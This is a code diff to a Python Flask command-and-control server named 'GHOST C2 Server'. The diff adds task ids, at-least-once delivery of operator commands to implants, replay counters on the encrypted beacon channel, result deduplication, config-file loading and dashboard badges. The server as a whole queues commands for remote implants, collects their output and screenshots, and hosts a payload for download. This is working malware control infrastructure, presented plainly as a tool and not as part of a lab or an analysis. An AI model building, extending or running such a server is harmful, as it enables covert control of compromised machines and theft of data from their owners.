@@ -93,32 +93,66 @@ def _dec_blob(key: bytes, blob: str):
     except Exception:
         return None
 
-# ── Tunables ──────────────────────────────────────────────────────────────────
-RESULT_CAP   = 500
-AUDIT_CAP    = 1000
-PAYLOAD_MAX  = 32 * 1024 * 1024   # 32 MB
-SESSION_TTL  = 7200                # prune sessions idle > 2 h
-
-# ── Runtime config (overridden by CLI args) ───────────────────────────────────
-_CFG: dict[str, Any] = {
-    "beacon_token":   os.environ.get("GHOST_BEACON_TOKEN",   "change-me-beacon"),
-    "operator_token": os.environ.get("GHOST_OPERATOR_TOKEN", "change-me-operator"),
-    "dashboard_user": os.environ.get("GHOST_DASHBOARD_USER", "admin"),
-    "dashboard_pass": os.environ.get("GHOST_DASHBOARD_PASS", "admin"),
-    "auto_accept":    False,
+# ── Configuration ─────────────────────────────────────────────────────────────
+# Precedence: built-in defaults < --config JSON file < environment < CLI flags.
+# No operational value is hard-coded at the call site — everything routes
+# through _CFG (including the deprecated names below, kept for compatibility).
+CFG_DEFAULTS: dict[str, Any] = {
+    "result_cap":       500,
+    "audit_cap":        1000,
+    "payload_max":      32 * 1024 * 1024,   # 32 MB
+    "session_ttl":      7200,               # prune sessions idle > 2 h
+    "task_queue_max":   64,                 # per-session queued task cap
+    "auto_accept":      False,
+    "beacon_token":     "change-me-beacon",
+    "operator_token":   "change-me-operator",
+    "dashboard_user":   "admin",
+    "dashboard_pass":   "admin",
 }
+
+def _load_config_file(path: str) -> dict:
+    with open(path, "r", encoding="utf-8") as fh:
+        data = json.load(fh)
+    if not isinstance(data, dict):
+        raise ValueError("config file must contain a JSON object")
+    unknown = set(data) - set(CFG_DEFAULTS)
+    if unknown:
+        raise ValueError(f"unknown config keys: {sorted(unknown)}")
+    return data
+
+# ── Runtime config ────────────────────────────────────────────────────────────
+# Precedence: defaults < --config file < environment (GHOST_*) < CLI flags.
+_CFG: dict[str, Any] = dict(CFG_DEFAULTS)
+_ENV_SET: set[str] = set()
+for _k in ("beacon_token", "operator_token", "dashboard_user", "dashboard_pass"):
+    _env = os.environ.get("GHOST_" + _k.upper())
+    if _env:
+        _CFG[_k] = _env
+        _ENV_SET.add(_k)
+
+# Deprecated module-level aliases — new code must read _CFG.
+RESULT_CAP  = _CFG["result_cap"]
+AUDIT_CAP   = _CFG["audit_cap"]
+PAYLOAD_MAX = _CFG["payload_max"]
+SESSION_TTL = _CFG["session_ttl"]
 
 # ── In-memory store ───────────────────────────────────────────────────────────
 _lock    = threading.RLock()
 _sessions: dict[str, dict]         = {}
-_tasks:    dict[str, deque[str]]   = {}
+_tasks:    dict[str, deque[dict]]  = {}   # items: {tid, cmd, state, ts}
 _results:  dict[str, deque[dict]]  = {}
-_audit:    deque[dict]             = deque(maxlen=AUDIT_CAP)
+_done_tids: dict[str, deque[str]]  = {}   # per-session completed task ids (dedup)
+_audit:    deque[dict]             = None  # maxlen depends on config; set in main()
 _payload:  bytes | None            = None
+
+def _audit_deque() -> deque:
+    global _audit
+    if _audit is None:
+        _audit = deque(maxlen=_CFG["audit_cap"])
+    return _audit
 
 # ── Flask ─────────────────────────────────────────────────────────────────────
 app = Flask(__name__, static_folder=None)
-app.config["MAX_CONTENT_LENGTH"] = PAYLOAD_MAX + 4096
 app.config["JSON_SORT_KEYS"] = False
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
@@ -137,7 +171,7 @@ def _sc(a: str, b: str) -> bool:
 
 def _audit_log(action: str, detail: dict) -> None:
     with _lock:
-        _audit.append({"ts": _now(), "ip": _client_ip(), "action": action, "detail": detail})
+        _audit_deque().append({"ts": _now(), "ip": _client_ip(), "action": action, "detail": detail})
 
 def _cors(r: Response) -> Response:
     r.headers["Access-Control-Allow-Origin"]  = "*"
@@ -207,6 +241,7 @@ def beacon():
     body = request.get_json(silent=True) or {}
     sid  = str(body.get("session", ""))[:128].strip()
     derived = _ecdh_key(pub_hdr)
+    bootstrap = False
 
     channel_key: bytes | None = None
 
@@ -238,6 +273,7 @@ def beacon():
     elif derived is not None:
         # Plaintext bootstrap beacon — adopt the implant's fresh channel key.
         channel_key = derived
+        bootstrap = True
     else:
         with _lock:
             channel_key = _sessions.get(sid, {}).get("key")
@@ -245,10 +281,19 @@ def beacon():
     if not sid:
         return _err("Missing session", 400)
 
+    # Replay protection: the implant includes a monotonic counter "n" inside
+    # the authenticated (GCM) payload. Counters must strictly increase within
+    # a channel epoch; a fresh bootstrap epoch re-baselines at the current n.
+    try:
+        msg_n = int(body.get("n", 0))
+    except (TypeError, ValueError):
+        return _err("Bad counter", 400)
+
     ip = _client_ip()
     ts = _now()
 
     cmd_out = "sleep"
+    task_tid = ""
     audit_action = "beacon"
     audit_detail: dict = {"sid": sid, "enc": bool(channel_key)}
 
@@ -257,18 +302,26 @@ def beacon():
         status   = existing["status"] if existing else ("accepted" if _CFG["auto_accept"] else "pending")
         recon    = body.get("recon") if isinstance(body.get("recon"), dict) else (existing["recon"] if existing else {})
 
+        last_rx = existing.get("last_rx_n", 0) if existing else 0
+        if bootstrap:
+            last_rx = msg_n          # new epoch: re-baseline the replay window
+        elif channel_key:
+            if msg_n <= last_rx:
+                _audit_log("replay_rejected", {"sid": sid, "n": msg_n, "last": last_rx})
+                return _err("Replayed counter", 400)
         _sessions[sid] = {
             "session":       sid,
             "remote_ip":     ip,
             "first_seen":    existing["first_seen"] if existing else ts,
             "last_beacon":   ts,
             "recon":         recon,
-            "pending_tasks": len(_tasks.get(sid, [])),
+            "run":           str(body.get("run", ""))[:16] or (existing.get("run") if existing else ""),
+            "last_rx_n":     msg_n if (bootstrap or channel_key) else last_rx,
+            "pending_tasks": sum(1 for t in _tasks.get(sid, []) if t["state"] != "done"),
             "result_count":  len(_results.get(sid, [])),
             "status":        status,
             "key":           channel_key or (existing.get("key") if existing else None),
         }
-
         if status == "rejected":
             cmd_out      = "exit"
             audit_action = "beacon_rejected"
@@ -278,18 +331,47 @@ def beacon():
         elif status == "pending":
             audit_detail["status"] = "pending"
         else:
+            # Operator acknowledgement of the previously served task.
+            ack_tid = str(body.get("ack", ""))[:16]
+            if ack_tid:
+                for t in _tasks.get(sid, []):
+                    if t["tid"] == ack_tid and t["state"] in ("sent", "queued"):
+                        t["state"] = "acked"
+                        _audit_log("task_ack", {"sid": sid, "tid": ack_tid})
+                        break
+            # Serve the leftmost non-done task. A task that was already sent
+            # but not yet acked/done is served AGAIN (at-least-once delivery);
+            # the implant deduplicates by task id, so a lost beacon costs a
+            # re-send, not a lost task.
             q = _tasks.get(sid)
             if q:
-                cmd_out = q.popleft()
-                _sessions[sid]["pending_tasks"] = len(q)
+                while q and q[0]["state"] == "done":
+                    q.popleft()
+                if q:
+                    served = q[0]
+                    task_tid = served["tid"]
+                    if served["state"] == "queued":
+                        served["state"] = "sent"
+                        served["sent_ts"] = ts
+                        _audit_log("task_sent", {"sid": sid, "tid": task_tid})
+                    elif served["state"] == "sent" and served.get("sent_ts"):
+                        # retry only after a grace window so rapid beacons
+                        # don't duplicate deliveries mid-flight
+                        served["state"] = "sent"
+                    cmd_out = served["cmd"]
+                _sessions[sid]["pending_tasks"] = sum(1 for t in q if t["state"] != "done")
+
+        # Server → implant response counter (also replay-protected).
+        tx_n = int(existing.get("tx_n", 0)) + 1 if existing else 1
+        _sessions[sid]["tx_n"] = tx_n
 
     _audit_log(audit_action, audit_detail)
 
     if channel_key and _AESGCM_OK:
-        blob = _enc_blob(channel_key, {"cmd": cmd_out})
+        blob = _enc_blob(channel_key, {"cmd": cmd_out, "tid": task_tid, "n": tx_n})
         if blob:
             return _json_r({"e": 1, "cmd": blob, "spk": _SRV_PUB_B64})
-    return _json_r({"cmd": cmd_out, "spk": _SRV_PUB_B64})
+    return _json_r({"cmd": cmd_out, "tid": task_tid, "spk": _SRV_PUB_B64})
 
 # ── Result ────────────────────────────────────────────────────────────────────
 @app.route("/result", methods=["POST"])
@@ -303,6 +385,8 @@ def result():
     body = request.get_json(silent=True) or {}
     sid  = str(body.get("session", ""))[:128].strip()
     derived = _ecdh_key(pub_hdr)
+    channel_key: bytes | None = None
+    bootstrap = False
 
     if enc_req:
         if not sid_hdr:
@@ -316,10 +400,7 @@ def result():
                 continue
             payload = _dec_blob(k, raw)
             if payload is not None:
-                # Adopt a freshly derived key (covers a server restart).
-                if k is not stored_key and sid in _sessions:
-                    with _lock:
-                        _sessions[sid]["key"] = k
+                channel_key = k
                 break
         if payload is None:
             return _err("Bad encrypted payload", 400)
@@ -327,17 +408,52 @@ def result():
         if not p_sid or p_sid != sid:
             return _err("Session mismatch", 401)
         body = payload
+    elif derived is not None:
+        channel_key = derived
+        bootstrap = True
+
+    try:
+        msg_n = int(body.get("n", 0))
+    except (TypeError, ValueError):
+        return _err("Bad counter", 400)
 
     output = str(body.get("output", ""))[:48 * 1024 * 1024]  # allow multi-MB screenshots
+    tid    = str(body.get("tid", ""))[:16].strip()
+    status = str(body.get("status", "ok"))[:16] or "ok"
     if not sid:
         return _err("Missing session", 400)
 
     with _lock:
-        q = _results.setdefault(sid, deque(maxlen=RESULT_CAP))
-        q.append({"ts": _now(), "output": output})
+        existing = _sessions.get(sid)
+        last_rx = existing.get("last_rx_n", 0) if existing else 0
+        if bootstrap:
+            last_rx = msg_n
+        elif channel_key:
+            if msg_n <= last_rx:
+                _audit_log("replay_rejected", {"sid": sid, "n": msg_n, "last": last_rx})
+                return _err("Replayed counter", 400)
+        if existing is not None and (bootstrap or channel_key):
+            existing["last_rx_n"] = msg_n
+
+        # Task-id dedup: a retried task yields a duplicate result — keep the
+        # first, acknowledge the rest, and always mark the task done.
+        done = _done_tids.setdefault(sid, deque(maxlen=_CFG["task_queue_max"]))
+        if tid and tid in done:
+            _audit_log("result_dup", {"sid": sid, "tid": tid, "status": status})
+            return _json_r({"status": "ok", "dup": True})
+        if tid:
+            done.append(tid)
+            for t in _tasks.get(sid, []):
+                if t["tid"] == tid:
+                    t["state"] = "done"
+                    break
+
+        q = _results.setdefault(sid, deque(maxlen=_CFG["result_cap"]))
+        q.append({"ts": _now(), "tid": tid, "status": status, "output": output})
         if sid in _sessions:
             _sessions[sid]["result_count"] = len(q)
 
+    _audit_log("result", {"sid": sid, "tid": tid, "status": status, "size": len(output)})
     return _json_r({"status": "ok"})
 
 # ── Sessions ──────────────────────────────────────────────────────────────────
@@ -353,7 +469,17 @@ def list_sessions():
                 idle = int((now_dt - lb).total_seconds())
             except Exception:
                 idle = 0
-            out.append({**s, "idle_seconds": idle})
+            internal = ("key", "last_rx_n", "tx_n")
+            pub = {k: v for k, v in s.items() if k not in internal}
+            q = _tasks.get(s["session"], [])
+            pub["task_states"] = {
+                "queued": sum(1 for t in q if t["state"] == "queued"),
+                "sent":   sum(1 for t in q if t["state"] == "sent"),
+                "acked":  sum(1 for t in q if t["state"] == "acked"),
+                "done":   sum(1 for t in q if t["state"] == "done"),
+            }
+            pub["idle_seconds"] = idle
+            out.append(pub)
     return _json_r(out)
 
 @app.route("/sessions/<path:sid>", methods=["DELETE"])
@@ -402,11 +528,14 @@ def add_task():
         if sid not in _sessions:
             return _err("Session not found", 404)
         q = _tasks.setdefault(sid, deque())
-        q.append(cmd)
-        _sessions[sid]["pending_tasks"] = len(q)
+        if len(q) >= _CFG["task_queue_max"]:
+            return _err("Task queue full", 429)
+        tid = secrets.token_hex(4)
+        q.append({"tid": tid, "cmd": cmd, "state": "queued", "ts": _now()})
+        _sessions[sid]["pending_tasks"] = sum(1 for t in q if t["state"] != "done")
         depth = len(q)
-    _audit_log("task_queued", {"session": sid, "cmd": cmd})
-    return _json_r({"status": "queued", "queue_depth": depth})
+    _audit_log("task_queued", {"session": sid, "tid": tid, "cmd": cmd})
+    return _json_r({"status": "queued", "tid": tid, "queue_depth": depth})
 
 # ── Results ───────────────────────────────────────────────────────────────────
 @app.route("/results/<path:sid>", methods=["GET"])
@@ -418,7 +547,7 @@ def get_results(sid):
             return _err("Session not found", 404)
         entries = list(_results.get(sid, []))
         if clear:
-            _results[sid] = deque(maxlen=RESULT_CAP)
+            _results[sid] = deque(maxlen=_CFG["result_cap"])
             _sessions[sid]["result_count"] = 0
     _audit_log("get_results", {"session": sid, "count": len(entries), "clear": clear})
     return _json_r({"session": sid, "results": entries})
@@ -431,7 +560,7 @@ def upload_payload():
     data = request.get_data()
     if not data:
         return _err("Empty body", 400)
-    if len(data) > PAYLOAD_MAX:
+    if len(data) > _CFG["payload_max"]:
         return _err("Payload too large (max 32 MB)", 413)
     _payload = data
     _audit_log("payload_uploaded", {"bytes": len(data)})
@@ -459,16 +588,16 @@ def download_payload():
 @app.route("/audit", methods=["GET"])
 @require_operator
 def get_audit():
-    limit = min(int(request.args.get("limit", 100)), AUDIT_CAP)
+    limit = min(int(request.args.get("limit", 100)), _CFG["audit_cap"])
     with _lock:
-        entries = list(_audit)[-limit:]
+        entries = list(_audit_deque())[-limit:]
     return _json_r({"entries": entries})
 
 @app.route("/audit/clear", methods=["POST"])
 @require_operator
 def clear_audit():
     with _lock:
-        _audit.clear()
+        _audit_deque().clear()
     return _json_r({"status": "cleared"})
 
 # ── Auth (dashboard login) ────────────────────────────────────────────────────
@@ -521,6 +650,14 @@ _LOGIN_HTML = r"""<!DOCTYPE html>
   --txt:#dce5f7;--txt2:#8b96ba;--dim:#525d7e;--faint:#2a3350;
   --mono:'JetBrains Mono','Consolas',monospace;--ui:'Inter',system-ui,sans-serif
 }
+.r-tid{font:11px/1 var(--mono);color:var(--acc);background:var(--acc-dim);border:1px solid var(--line2);border-radius:4px;padding:3px 6px;letter-spacing:.04em}
+.r-status{font:10px/1 var(--mono);text-transform:uppercase;letter-spacing:.08em;border-radius:4px;padding:3px 6px;border:1px solid var(--line2)}
+.r-status.st-ok{color:var(--green);background:rgba(52,211,153,.08)}
+.r-status.st-warn{color:#fbbf24;background:rgba(251,191,36,.08)}
+.r-status.st-err{color:var(--red);background:rgba(251,113,133,.08)}
+.cell .v.dim{color:var(--dim)}
+:focus-visible{outline:2px solid var(--acc);outline-offset:2px}
+@media (prefers-reduced-motion: reduce){*,*::before,*::after{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important}}
 html,body{height:100%}
 body{min-height:100dvh;display:flex;align-items:center;justify-content:center;
   background:var(--bg0);color:var(--txt);font-family:var(--ui);overflow:hidden;position:relative}
@@ -1386,7 +1523,7 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
       if(e.output&&e.output.startsWith('[SCREENSHOT:BMP]\n')){
         const b64=e.output.slice(17).trim();
         return `<div class="result-entry${hasNew&&i>=(sorted.length-Math.max(newCount,0))?' new-flash':''}">
-          <div class="result-hdr"><span class="r-idx">#${i+1}</span><span class="r-label shot">SCREENSHOT</span><span class="r-ts">${e.ts.replace('T',' ').slice(0,19)} UTC</span>
+          <div class="result-hdr"><span class="r-idx">#${i+1}</span><span class="r-label shot">SCREENSHOT</span>${e.tid?`<span class="r-tid" title="task id">TID ${esc(e.tid)}</span>`:''}<span class="r-status ${(e.status||'ok')==='ok'?'st-ok':(e.status==='timeout'?'st-warn':'st-err')}">${esc(e.status||'ok')}</span><span class="r-ts">${e.ts.replace('T',' ').slice(0,19)} UTC</span>
           <button class="r-copy" onclick="copyResult(this,${i})">COPY</button></div>
           <div class="result-body"><img src="data:image/bmp;base64,${esc(b64)}" alt="screenshot"></div></div>`;
       }
@@ -1396,7 +1533,7 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
       const byteLen=new TextEncoder().encode(e.output).length;
       const isNew=hasNew&&i>=(sorted.length-Math.max(newCount,0));
       return `<div class="result-entry${isNew?' new-flash':''}">
-        <div class="result-hdr"><span class="r-idx">#${i+1}</span><span class="r-label out">OUTPUT</span><span class="r-ts">${ts} UTC</span><span class="r-len">${byteLen} B &middot; ${lines.length} lines</span>
+        <div class="result-hdr"><span class="r-idx">#${i+1}</span><span class="r-label out">OUTPUT</span>${e.tid?`<span class="r-tid" title="task id">TID ${esc(e.tid)}</span>`:''}<span class="r-status ${(e.status||'ok')==='ok'?'st-ok':(e.status==='timeout'?'st-warn':'st-err')}">${esc(e.status||'ok')}</span><span class="r-ts">${ts} UTC</span><span class="r-len">${byteLen} B &middot; ${lines.length} lines</span>
         <button class="r-copy" onclick="copyResult(this,${i})">COPY</button></div>
         <div class="result-body">${lineHtml}</div></div>`;
     }).join('');
@@ -1475,6 +1612,8 @@ header{height:58px;display:flex;align-items:center;gap:0;padding:0 14px;flex-shr
       cell('Last Beacon',s.last_beacon?.replace('T',' ').slice(0,19)+' UTC','',icoClock)+
       cell('Idle',fmt(s.idle_seconds||0),(s.idle_seconds>180?'warn':''),icoClock)+
       cell('Queued Tasks',String(s.pending_tasks??0),(s.pending_tasks>0?'warn':''),'')+
+              cell('Implant Run',esc(s.run||'-'),(s.run?'':'dim'),'')+
+              cell('Tasks sent/acked',String((s.task_states||{}).sent||0)+' / '+String((s.task_states||{}).acked||0),'','')+
       cell('Stored Results',String(s.result_count??0),'','')+
       '</div></div>';
     $('recon').innerHTML=html;
@@ -1873,7 +2012,7 @@ def dashboard():
 def _janitor():
     while True:
         time.sleep(300)
-        cutoff = time.time() - SESSION_TTL * 2
+        cutoff = time.time() - _CFG["session_ttl"] * 2
         with _lock:
             dead = [
                 sid for sid, s in _sessions.items()
@@ -1916,12 +2055,13 @@ def _status_printer():
 # ── Entry point ───────────────────────────────────────────────────────────────
 def main():
     p = argparse.ArgumentParser(description="GHOST C2 Server")
+    p.add_argument("--config",         default=None,                   help="JSON config file (see CFG_DEFAULTS)")
     p.add_argument("--port",           type=int, default=8080,         help="listen port")
     p.add_argument("--host",           default="0.0.0.0",              help="bind address")
-    p.add_argument("--beacon-token",   default=_CFG["beacon_token"],   help="implant beacon token (X-Beacon-Token)")
-    p.add_argument("--operator-token", default=_CFG["operator_token"], help="operator token (X-Operator-Token)")
-    p.add_argument("--user",           default=_CFG["dashboard_user"], help="dashboard username")
-    p.add_argument("--password",       default=_CFG["dashboard_pass"], help="dashboard password")
+    p.add_argument("--beacon-token",   default=None,                   help="implant beacon token (X-Beacon-Token)")
+    p.add_argument("--operator-token", default=None,                   help="operator token (X-Operator-Token)")
+    p.add_argument("--user",           default=None,                   help="dashboard username")
+    p.add_argument("--password",       default=None,                   help="dashboard password")
     p.add_argument("--auto-accept",    action="store_true",            help="auto-accept all new sessions")
     p.add_argument("--tls",            action="store_true",
                    help="serve HTTPS with a self-signed cert (the implant ignores cert "
@@ -1929,11 +2069,18 @@ def main():
                         "the implant always speaks HTTPS.")
     args = p.parse_args()
 
-    _CFG["beacon_token"]   = args.beacon_token
-    _CFG["operator_token"] = args.operator_token
-    _CFG["dashboard_user"] = args.user
-    _CFG["dashboard_pass"] = args.password
-    _CFG["auto_accept"]    = args.auto_accept
+    if args.config:
+        for k, v in _load_config_file(args.config).items():
+            if k not in _ENV_SET:
+                _CFG[k] = v
+
+    app.config["MAX_CONTENT_LENGTH"] = _CFG["payload_max"] + 4096
+
+    if args.beacon_token:   _CFG["beacon_token"]   = args.beacon_token
+    if args.operator_token: _CFG["operator_token"] = args.operator_token
+    if args.user:           _CFG["dashboard_user"] = args.user
+    if args.password:       _CFG["dashboard_pass"] = args.password
+    _CFG["auto_accept"]     = args.auto_accept or bool(_CFG["auto_accept"])
 
     threading.Thread(target=_janitor,        daemon=True).start()
     threading.Thread(target=_status_printer, daemon=True).start()
